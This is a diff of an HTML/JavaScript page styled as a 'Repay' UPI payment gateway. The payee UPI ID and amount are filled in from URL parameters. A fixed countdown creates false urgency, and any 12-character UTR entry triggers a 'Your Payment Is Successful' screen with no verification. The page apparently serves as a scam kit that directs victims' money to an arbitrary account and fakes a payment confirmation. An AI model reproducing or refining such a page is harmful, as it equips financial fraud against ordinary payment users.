@@ -1,44 +1,117 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment</title>
+    <title>Repay Payment</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; background-color: #f8f9fa; }
+        .header { background: #ff4d4d; color: white; padding: 10px; text-align: center; font-weight: bold; position: relative; }
+        .header span { position: absolute; left: 15px; font-size: 20px; }
+        .sub-header { background: #0081ff; color: white; padding: 12px; text-align: center; font-size: 16px; }
+        .container { padding: 15px; }
+        .order-timer { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; color: #333; font-size: 14px; }
+        .timer-box { background: #0081ff; color: white; padding: 2px 5px; border-radius: 3px; margin-left: 5px; }
+        
+        .info-row { display: flex; justify-content: space-between; align-items: center; background: white; padding: 12px; border: 1px solid #ddd; border-radius: 5px; margin-bottom: 10px; }
+        .info-label { color: #666; font-size: 14px; }
+        .info-value { font-weight: bold; font-size: 16px; color: #333; }
+        .copy-btn { border: 1px solid #0081ff; color: #0081ff; background: white; padding: 5px 12px; border-radius: 4px; font-size: 12px; cursor: pointer; text-transform: uppercase; }
+        
+        .methods { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
+        .method-box { background: white; border: 1px solid #ddd; padding: 15px; border-radius: 8px; text-align: center; }
+        .method-box img { height: 25px; vertical-align: middle; }
+        
+        .utr-section { margin-top: 20px; }
+        .utr-label { color: #0081ff; font-size: 13px; margin-bottom: 10px; display: block; }
+        .utr-input-group { display: flex; align-items: center; background: white; border-bottom: 1px solid #eee; padding: 10px 0; }
+        .utr-input-group span { font-weight: bold; margin-right: 15px; color: #333; }
+        .utr-input-group input { border: none; outline: none; width: 100%; font-size: 15px; color: #ccc; }
+        
+        .submit-btn { background: #0081ff; color: white; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 16px; margin-top: 20px; cursor: pointer; }
+        
+        .notice { color: #d9534f; font-size: 12px; margin-top: 20px; font-weight: bold; }
+        .notice p { margin: 5px 0; }
+        
+        /* Success Screen */
+        #success-view { display: none; text-align: center; padding: 50px 20px; background: white; height: 100vh; }
+    </style>
 </head>
-<body style="padding: 20px; font-family: sans-serif;">
+<body>
 
-<div id="first-view">
-    <p>Payee Name: <b id="name"></b></p>
-    <p>UPI ID: <b id="vpa"></b></p>
-    <p>Amount: ₹<b id="amnt"></b></p>
-    
-    <br>
-    <label>Enter 12 Digit UTR:</label><br>
-    <input type="text" id="utr-in" maxlength="12" style="padding: 8px; margin-top: 5px; width: 80%;">
-    <br><br>
-    <button onclick="check()" style="padding: 10px 20px; background: green; color: white; border: none; border-radius: 5px;">Submit</button>
+<div id="payment-view">
+    <div class="header"><span><</span> Repay</div>
+    <div class="sub-header">Payment</div>
+
+    <div class="container">
+        <div class="order-timer">
+            <span>Order will be closed in:</span>
+            <span><span class="timer-box">8</span> : <span class="timer-box">45</span></span>
+        </div>
+
+        <div class="info-row">
+            <span class="info-label">Amount</span>
+            <span class="info-value">₹ <span id="amt"></span></span>
+            <button class="copy-btn" onclick="copy('amt')">COPY</button>
+        </div>
+
+        <div class="info-row" style="margin-bottom: 5px;">
+            <span class="info-label">VPA/UPI ID</span>
+            <span class="info-value" id="vpa" style="font-size: 14px;"></span>
+            <button class="copy-btn" onclick="copy('vpa')">COPY</button>
+        </div>
+
+        <div style="color: #0081ff; font-size: 12px; margin-bottom: 15px;">②How to transfer money🔗</div>
+
+        <div class="methods">
+            <div class="method-box"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo.png" alt="PhonePe"></div>
+            <div class="method-box"><img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Paytm_Logo.png" alt="Paytm"></div>
+            <div class="method-box"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_Logo.svg" alt="GPay"></div>
+            <div class="method-box"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/BHIM_Logo.png" alt="BHIM"></div>
+        </div>
+
+        <div class="utr-section">
+            <span class="utr-label">↓ Fill the UTR numbers after you done payment</span>
+            <div class="utr-input-group">
+                <span>UTR</span>
+                <input type="text" id="utr_in" placeholder="Input UTR number" maxlength="12">
+            </div>
+            <button class="submit-btn" onclick="verify()">Submit UTR</button>
+        </div>
+
+        <div class="notice">
+            Notice:
+            <p>1. One UPI can only transfer money once.</p>
+            <p>2. Don't change the payment amount. Otherwise, the order cannot be closed.</p>
+        </div>
+    </div>
 </div>
 
-<div id="success-view" style="display: none; text-align: center; margin-top: 50px;">
-    <h1 style="color: green;">✔</h1>
-    <h2 style="color: green;">Your Payment Is Successful</h2>
-    <h3>Thank You For Staying With Us</h3>
-    <p>Thank You So Much Sir/Ma'am</p>
+<div id="success-view">
+    <div style="font-size: 70px; color: #28a745; margin-bottom: 20px;">✔</div>
+    <h2 style="color: #28a745;">Your Payment Is Successful</h2>
+    <h3 style="color: #333;">Thank You For Staying With Us</h3>
+    <p style="color: #555; font-size: 18px;">Thank You So Much Sir/Ma'am</p>
 </div>
 
 <script>
-    // URL থেকে আগের মতোই ডেটা নেওয়া হচ্ছে
-    const urlParams = new URLSearchParams(window.location.search);
-    document.getElementById('name').innerText = urlParams.get('nameInput') || "S DATTATHREYA";
-    document.getElementById('vpa').innerText = urlParams.get('vpaInput') || "444444784@axl";
-    document.getElementById('amnt').innerText = urlParams.get('amntInput') || "5200";
+    const params = new URLSearchParams(window.location.search);
+    document.getElementById('amt').innerText = params.get('amntInput') || "3500";
+    document.getElementById('vpa').innerText = params.get('vpaInput') || "riti****@slc";
 
-    function check() {
-        var input = document.getElementById('utr-in').value;
-        if(input.length === 12) {
-            document.getElementById('first-view').style.display = 'none';
+    function copy(id) {
+        const text = document.getElementById(id).innerText;
+        navigator.clipboard.writeText(text);
+        alert("Copied: " + text);
+    }
+
+    function verify() {
+        const utr = document.getElementById('utr_in').value;
+        if(utr.length === 12) {
+            document.getElementById('payment-view').style.display = 'none';
             document.getElementById('success-view').style.display = 'block';
         } else {
-            alert("Please enter 12 digit UTR");
+            alert("Please input 12 digit UTR number");
         }
     }
 </script>
